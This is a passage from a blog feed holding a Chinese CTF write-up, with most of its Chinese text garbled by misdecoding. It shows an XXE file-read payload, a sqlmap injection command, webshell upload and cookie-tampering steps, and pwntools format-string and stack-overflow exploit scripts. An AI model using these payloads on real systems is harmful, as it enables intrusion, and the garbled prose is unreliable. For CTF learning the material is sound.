ï¼Œå»ä½“éªŒç¤¾ä¼šçš„å°ç©ºé—´ã€‚å½“ç„¶ï¼Œå¯èƒ½æŸäº›äººè¿›å…¥å¤§å­¦ä¹‹åï¼Œå•Šæˆ‘çš„å¤§å­¦æ€ä¹ˆæ€ä¹ˆæ ·ï¼Œæ€ä¹ˆæ€ä¹ˆæƒ¨ï¼ŒæŠ±æ€¨èµ„æºä¸å…¬ï¼Œå“€å¹ç¤¾ä¼šå¦‚ä½•ï¼Œç„¶åè½¬èº«åˆæ‰‘è¿›äº†æ¸¸æˆä¸–ç•Œã€‚æƒ³æƒ³å…¶å®ä¹ŸæŒºå‚»çš„ï¼Œä¸å…¬èƒ½æ€æ ·ï¼Ÿè°è®©è‡ªå·±æä¸äº†ä¸€ä¸ªå¥½å¹³å°ï¼Œè°è®©è‡ªå·±å¾—ä¸åˆ°é‚£ç‚¹ä»…æœ‰çš„èµ„æºï¼Œåˆæ˜¯è°åœ¨ä¸€æ¬¡ä¸€æ¬¡å •è½ä¹‹åç»§ç»­å •è½ï¼Ÿé‚£è‚¯å®šæ˜¯è‡ªå·±å’¯ğŸ˜­ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€ä»¥å¦‚æœè‡ªå·±ä¸å»å®ç°ä¸€ç‚¹èƒ½å¤Ÿå®ç°çš„ä»·å€¼ï¼Œæ¥å°è¯ä¸€ä¸‹è‡ªå·±çš„èƒ½åŠ›ï¼Œé‚£å¦‚ä½•æ‰èƒ½è·å¾—é‚£æ‰€è°“çš„å…¬å¹³ï¼Œå¦‚ä½•å»èå…¥ä½ æ‰¹åˆ¤ï¼Œå“€å¹çš„é‚£ä¸ªç¤¾ä¼šã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æœªæ¥ä¹‹è·¯è™½ç„¶åå·ï¼Œä½†å¸Œæœ›ä¸è¯¸ä½åŒè¡Œä¹‹äººï¼Œå…±åŒå‰è¿›ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Publish by Yof3ng.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="æ‚æ–‡" scheme="http://www.yof3ng.xyz/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="æ‚æ–‡" scheme="http://www.yof3ng.xyz/tags/%E6%9D%82%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>wandoucup-ctf</title>
    <link href="http://www.yof3ng.xyz/2018/10/28/wandoucup-ctf/"/>
    <id>http://www.yof3ng.xyz/2018/10/28/wandoucup-ctf/</id>
    <published>2018-10-28T06:01:54.000Z</published>
    <updated>2019-04-02T08:46:39.866Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="wandoucup-ctf"><a href="#wandoucup-ctf" class="headerlink" title="wandoucup-ctf"></a>wandoucup-ctf</h1><blockquote><p>è¿™ä¸¤å¤©åœ¨æ‰“ä¸€ä¸ªç¨å¾®ç®€å•çš„CTFï¼Œå†™ä¸ªwriteupè®°å½•ä¸€ä¸‹è¢«è™çš„è¿‡ç¨‹ğŸ˜­ï¼Œæ€»çš„æ¥è¯´è¿™åœºå°èµ›æ˜¯ä¸ªå¤§æ‚çƒ©ï¼Œæ¯•ç«Ÿä½ æ‡‚çš„ğŸ˜ï¼Œä½œä¸ºåšé¢˜è€…æˆ‘ä»¬å½“ç„¶æ˜¯æœ‰é¢˜åšå°±okçš„ã€‚</p><p>ç”±äºæ¯”èµ›åç¯å¢ƒå…³é—­ï¼Œæ‰€ä»¥æœ‰çš„æ— å›¾ç‰‡å±•ç¤ºï¼Œç°æœ‰çš„å›¾ç‰‡æ˜¯ä¸‹åˆå°±å‡†å¤‡å†™writeupæˆªçš„å›¾ã€‚</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1-ç­¾åˆ°é¢˜"><a href="#web1-ç­¾åˆ°é¢˜" class="headerlink" title="web1-ç­¾åˆ°é¢˜"></a>web1-ç­¾åˆ°é¢˜</h3><p><a href="http://101.231.137.47:20001/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>è·ŸæŸå‡ ä¸ªctfç»ƒä¹ å¹³å°ä¸Šé¢çš„æ»‘ç¨½é¢˜ä¸€æ ·ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd55a6403431.png" alt=""></p></blockquote><p>ä¸€é”®è·å–flagğŸ˜„ã€‚</p><h3 id="web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag"><a href="#web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag" class="headerlink" title="web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag"></a>web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag</h3><p><a href="http://101.231.137.47:20002/4.php" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>ç®€å•æµè§ˆä¸€ä¸‹ï¼Œå°±æ˜¯ä¸€ä¸ªçˆ†ç ´çš„é¢˜ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd56b3b1d5b7.png" alt=""></p><p>å¯†ç ä¸ºäº”ä½æ•°ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šburpsuiteå’¯ï¼šè®¾ç½®é•¿åº¦å’Œpayloadå­—ç¬¦ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd56b9a814dd.png" alt=""></p><p><img src="https://i.loli.net/2018/10/28/5bd590f273c5b.png" alt=""></p><p>GET FLAG!</p></blockquote><h3 id="web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ"><a href="#web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ" class="headerlink" title="web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ"></a>web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ</h3><p><a href="http://101.231.137.47:20003/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>ç®€å•åœ°æŠ“åŒ…ä¿®æ”¹å‚æ•°ï¼Œä»è€Œä½¿å¾—è‡ªå·±èƒ½å¤Ÿä¼ phpï¼Œæˆ‘ç›´æ¥ä¸Šäº†ä¸€ä¸ªå¤§é©¬ï¼Œç„¶åçœ‹/opt/flag.txtã€‚</p><p><img src="https://i.loli.net/2018/10/28/5bd56d1fde396.png" alt=""></p><p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°urlä¸­çš„extå‚æ•°ä¼ é€’çš„æ˜¯æ–‡ä»¶ç±»å‹ï¼ŒçŒœæµ‹æ˜¯å¯ä»¥ä¿®æ”¹ï¼Œæˆ‘ä»¬åŠ ä¸ªphpåˆ°ä¸­é—´å³å¯æˆåŠŸåœ°ç›´æ¥ä¸Šä¼ webshellï¼ˆå¾ˆæŠ è„šï¼‰ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56da602535.png" class="lazyload"></p><p>ç„¶åå†ä¿®æ”¹ä¸€ä¸‹content-typeå³å¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56ea016a98.png" class="lazyload"></p></blockquote><p>To /opt/flag.txt  get flag==&gt;ğŸ˜„</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56ef831e0e.png" class="lazyload"></p><h3 id="web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ"><a href="#web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ" class="headerlink" title="web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ"></a>web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ</h3><p>é¢˜ç›®é“¾æ¥</p><blockquote><p>æµè§ˆä¸€ä¸‹ï¼ŒåŠ ä¸ªå•å¼•å·è¯•è¯•å°±ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ³¨å…¥å’¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56f5203775.png" class="lazyload"></p><p>ç›´æ¥sqlmapæ³¨å…¥å³å¯ï¼Œ<code>sqlmap -u http://101.231.137.47:20004/php/index.php?gid=1 --dbs</code></p><p>å¾—åˆ°æ•°æ®åº“ååç›´æ¥é€æ­¥æŒ‡å®šæ•°æ®åº“è¡¨ï¼ŒæŒ‡å®šå­—æ®µï¼Œdumpå³å¯ã€‚</p><p>ç”±äºæ¯”èµ›åæœåŠ¡å·²ç»å…³é—­æ•…æœªèƒ½æˆªå–æˆåŠŸå›¾ç‰‡ã€‚</p></blockquote><h3 id="web5-API"><a href="#web5-API" class="headerlink" title="web5-API"></a>web5-API</h3><blockquote><p>è¿™é¢˜æ˜¯xxeå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œé€šè¿‡æŠ“åŒ…ï¼Œä¿®æ”¹POSTæ•°æ®ä»¥åŠContent-typeä»è€Œè¯»å–åˆ°/tmp/flag.txtã€‚</p><blockquote><p>XXEæ¼æ´å°±æ˜¯æœåŠ¡å™¨æ¥å—ä»å®¢æˆ·ç«¯å‘é€æ¥çš„xmlæ ¼å¼æ•°æ®æ—¶ï¼Œxmlæ•°æ®ä¸­æ¶æ„çš„å¼•ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œå°†å®ƒçš„å€¼ç»‘å®šä¸ºæœåŠ¡å™¨çš„ç›®æ ‡æ–‡ä»¶ï¼Œè¿™æ ·åœ¨æœåŠ¡å™¨è¿”å›ç»™æˆ‘ä»¬è§£æåçš„å€¼æ—¶ï¼Œå°±ä¼šæŠŠç›®æ ‡æ–‡ä»¶çš„å†…å®¹è¿”å›ç»™æˆ‘ä»¬ï¼Œä»è€Œè¯»å–æ•æ„Ÿæ–‡ä»¶å†…å®¹ã€‚</p></blockquote><p>é¢˜ç›®åŸæœ¬ä¼ è¾“çš„<code>Content-type: application/json</code>æ”¹ä¸º<code>Content-type: application/xml</code>ï¼Œå¹¶å°†POSTçš„æ•°æ®æ”¹ä¸ºä»¥ä¸‹xmlä»£ç :</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=â€1.0â€³?></span><span class="token doctype">&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM â€œfile:///tmp/flag.txtâ€></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span></code></pre><p>ç„¶åå‘é€æ•°æ®åŒ…ï¼Œå°±å¯å¾—åˆ°apiè¿”å›çš„flagäº†ã€‚</p></blockquote><h3 id="web6-sweet-home"><a href="#web6-sweet-home" class="headerlink" title="web6-sweet home"></a>web6-sweet home</h3><blockquote><p>è¿™é“é¢˜æœ‰ç‚¹ä¸œè¥¿ï¼Œä¸€æ­¥ä¸€æ­¥æ·±å…¥ï¼Œåˆ°æœ€åä¸€ä¸ªæç¤ºæ”¾å‡ºä¹‹åå‡ åˆ†é’Ÿï¼Œè¿…é€Ÿæ‹¿åˆ°flagã€‚</p><p>æ­¥éª¤ï¼šç™»å½•å’Œæ³¨å†Œç•Œé¢éœ€è¦å†™è„šæœ¬æŠ›å‡ºå¯¹åº”è§„åˆ™çš„codeï¼Œç„¶åé€šè¿‡ç›®å½•éå†å¾—åˆ°éƒ¨åˆ†é¡µé¢æºç ä»¥åŠä¸€ä¸ªç›®å½•(åˆ†åˆ«æ˜¯<code>user.php~</code>ï¼Œ <code>config.php~</code>ï¼Œ<code>adminpic</code>)ï¼Œæ ¹æ®æºç å¯ä»¥å¾—çŸ¥adminpicæ˜¯adminç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„ä¸€ä¸ªç›®å½•ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼Œå…¨ç«¯å£æ‰«æå¾—åˆ°23306ç«¯å£ä¸ºæ•°æ®åº“æœåŠ¡ç«¯å£ï¼Œç™»é™†åå¾—åˆ°adminè´¦æˆ·å¯†ç ï¼Œç»è¿‡å¤§åŠå¤©çš„ç ´è§£md5ä¹‹åï¼Œå¾—åˆ°æç¤º<code>crypto.html</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªæŒ‡å®šçš„è§£å¯†md5çš„é¡µé¢ï¼Œè¾“å…¥adminå¯†ç hashå€¼ç ´è§£å¾—åˆ°æç¤º<code>crypto.png</code>ï¼Œè®¿é—®å¾—åˆ°äºŒç»´ç ï¼Œæ‰«æå³å¯è·å¾—å¯†ç <code>wandouxueyuan:)</code>ï¼Œç”¨æ­¤å¯†ç å¯ç™»å½•adminè´¦æˆ·ï¼Œæ¥åˆ°ä¸Šä¼ å›¾ç‰‡publishé¡µé¢ï¼Œç»“åˆå‰é¢éå†å¾—åˆ°çš„ä¸€ä¸ª<code>adminpic</code>ç›®å½•å¯ä»¥çŸ¥é“ä¸Šä¼ æ–‡ä»¶åœ¨æ­¤ç›®å½•ä¸­ï¼Œç»è¿‡ç®€å•çš„ç»•è¿‡åä¸Šä¼ å¤§é©¬å³å¯ã€‚</p><p>å‚»å‚»çš„æˆ‘è¿˜å°è¯•æ–‡ä»¶åŒ…å«ï¼Œsession_decodeï¼Œä»¥åŠregisteræ³¨å†Œç­‰ç­‰æ“ä½œã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5d5ba033c9.png" class="lazyload"></p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a2a3dd284.png" class="lazyload"></p><p>ä¼ å®Œé©¬åè®¿é—®/adminpicç›®å½•å³å¯çœ‹åˆ°è‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä»è€Œgetshellæ‹¿åˆ°flagï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5d6ffa0abd.png" class="lazyload"></p><h3 id="webé™„åŠ é¢˜-atom"><a href="#webé™„åŠ é¢˜-atom" class="headerlink" title="webé™„åŠ é¢˜-atom"></a>webé™„åŠ é¢˜-atom</h3><blockquote><p>è¿™é“webåŠ é¤é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯ç”¨ç»™çš„è´¦æˆ·å¯†ç ç™»å½•åå°†cookieä¸­çš„<code>admin=0</code>æ”¹ä¸º<code>admin=1</code>ï¼Œç„¶åä¼šè·³è½¬åˆ°ä¸€ä¸ªåå°ï¼Œç„¶åæŸ¥çœ‹åå°æºç å³å¯å¾—åˆ°çœŸæ­£çš„flagã€‚</p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><blockquote><p>ä¸‰ä¸ªpwnéƒ½éå¸¸ç»å…¸ï¼Œåˆ†åˆ«è€ƒå¯Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç®€å•çš„æº¢å‡ºï¼Œä»¥åŠret2syså‡ ä¸ªçŸ¥è¯†ç‚¹ã€‚</p></blockquote><h3 id="pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h3><p>é€šè¿‡ç”¨IDAç®€å•åœ°åˆ†æä¸€ä¸‹é€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°printfå¤„å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#vuln_funå‡½æ•°ä¼ªcä»£ç </span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-7Ch]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-8h] [ebp-78h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-4h] [ebp-74h]</span>  <span class="token keyword">int</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-70h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-6Ch]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-68h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-64h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-60h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-5Ch]</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-58h]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-54h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-50h]</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-4Ch]</span>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-48h]</span>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-44h]</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-40h]</span>  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-3Ch]</span>  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-38h]</span>  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-34h]</span>  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-30h]</span>  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-28h]</span>  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-24h]</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-20h]</span>  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-1Ch]</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+64h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-4h]</span>  v31 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>    <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    v4<span class="token punctuation">,</span>    v5<span class="token punctuation">,</span>    v6<span class="token punctuation">,</span>    format<span class="token punctuation">,</span>    v8<span class="token punctuation">,</span>    v9<span class="token punctuation">,</span>    v10<span class="token punctuation">,</span>    v11<span class="token punctuation">,</span>    v12<span class="token punctuation">,</span>    v13<span class="token punctuation">,</span>    v14<span class="token punctuation">,</span>    v15<span class="token punctuation">,</span>    v16<span class="token punctuation">,</span>    v17<span class="token punctuation">,</span>    v18<span class="token punctuation">,</span>    v19<span class="token punctuation">,</span>    v20<span class="token punctuation">,</span>    v21<span class="token punctuation">,</span>    v22<span class="token punctuation">,</span>    v23<span class="token punctuation">,</span>    v24<span class="token punctuation">,</span>    v25<span class="token punctuation">,</span>    v26<span class="token punctuation">,</span>    v27<span class="token punctuation">,</span>    v28<span class="token punctuation">,</span>    v29<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//è¦†ç›–gotè¡¨ä¸­fflushæ¡ç›®æŒ‡å‘çš„åœ°å€ï¼Œå°†å…¶æŒ‡å‘read_flagå‡½æ•°</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ç®€å•è¿è¡Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ è¯­å¥ï¼š<code>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</code>ï¼Œç„¶åè¾“å…¥å¾—åˆ°ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a6468eaa6.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è¾“å…¥è¢«æ”¾åœ¨äº†printfå‡½æ•°æ ˆä¸­çš„ç¬¬6ä¸ªä½ç½®ï¼ˆè¿™é‡Œçš„%pæ˜¯c/c++ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ï¼‰ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ€ä¸»è¦çš„å±å®³å°±æ˜¯å¯ä»¥è·å–ä»»æ„åœ°å€å†…å®¹ï¼Œæˆ–è€…å®ç°ä»»æ„åœ°å€å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™å°±æ˜¯é€šè¿‡ä»»æ„åœ°å€å†™ï¼Œæ¥è¦†ç›–gotè¡¨ï¼Œä¹‹å‰çš„<a href="https://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/">ç»ƒä¹ è®°å½•</a>ä¸­å°±æåˆ°äº†è¿™äº›çŸ¥è¯†ã€‚</p><p>æ—¢ç„¶çŸ¥é“äº†åˆ©ç”¨ä½ç½®ï¼Œé‚£ä¹ˆç›´æ¥åˆ©ç”¨pwntoolsæ„é€ expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#io = process('./200')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./200'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20010'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read_flag_addr = 0x0804859B</span>read_flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read_flag'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = 0x0804A034</span>got_printf_addr <span class="token operator">=</span> <span class="token number">0x0804A00c</span>got_fflush_addr <span class="token operator">=</span> <span class="token number">0x0804A010</span><span class="token comment" spellcheck="true">#è¦†ç›–fflushåœ°å€æŒ‡å‘çš„å†…å®¹ï¼Œä»è€Œå®ç°read_flagè·³è½¬</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>got_fflush_addr<span class="token punctuation">:</span> <span class="token number">0x0804859B</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>expæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5919f74fc3.png" class="lazyload"></p><h3 id="pwn2â€“æ ˆæº¢å‡º"><a href="#pwn2â€“æ ˆæº¢å‡º" class="headerlink" title="pwn2â€“æ ˆæº¢å‡º"></a>pwn2â€“æ ˆæº¢å‡º</h3><blockquote><p>ç®€å•çš„æ ˆæº¢å‡ºå•¦ï¼Œå¾ˆå¸¸è§çš„ï¼Œæ‰¾åˆ°æº¢å‡ºç‚¹ç„¶åæŠŠEIPæŒ‡å‘æˆ‘ä»¬çš„<code>win</code>å‡½æ•°åœ°å€å³å¯:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a81b27580.png" class="lazyload"></p><p>é€šè¿‡<code>gdb-peda</code>,patternæ¨¡å—ï¼Œæ‰¾åˆ°æº¢å‡ºåç§»é‡ä¸º76ï¼Œä¹Ÿå°±æ˜¯è¯´åªéœ€è¦æ„é€ <code>76*&#39;a&#39; + win_addr</code>å³å¯:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a40fae3f4.png" class="lazyload"></p></blockquote><p>æ„é€ exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#idaä¸­æœ‰winå‡½æ•°çš„åœ°å€</span>win_addr <span class="token operator">=</span> <span class="token number">0x08048488</span><span class="token comment" spellcheck="true">#io = process('101.231.137.47',20011)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./100'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">76</span><span class="token operator">*</span><span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœ(å› ä¸ºç¯å¢ƒå·²ç»å…³é—­ï¼Œæ‰€ä»¥åªèƒ½å±•ç¤ºæœ¬åœ°æ•ˆæœ):</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a99272847.png" class="lazyload"></p><h3 id="pwn3â€“ret2syscall"><a href="#pwn3â€“ret2syscall" class="headerlink" title="pwn3â€“ret2syscall"></a>pwn3â€“ret2syscall</h3><blockquote><p>pwn3çš„è¯ç¨å¾®æ¯”ä¸Šé¢ä¸¤é¢˜è¦éš¾ä¸Šä¸€ç‚¹ç‚¹ï¼Œä¸è¿‡è¿˜åœ¨æˆ‘è¿™ä¸ªèŒæ–°çš„æ‰¿å—èŒƒå›´ä¹‹å†…ï¼Œå…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤æªæ–½ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5ab2b01106.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°åªæ˜¯å¼€äº†æ ˆä¸å¯æ‰§è¡Œ ï¼ˆNX)ï¼Œé™æ€åˆ†æä¸€æ³¢:</p><p><img src="/images/placeholder.png" alt="" 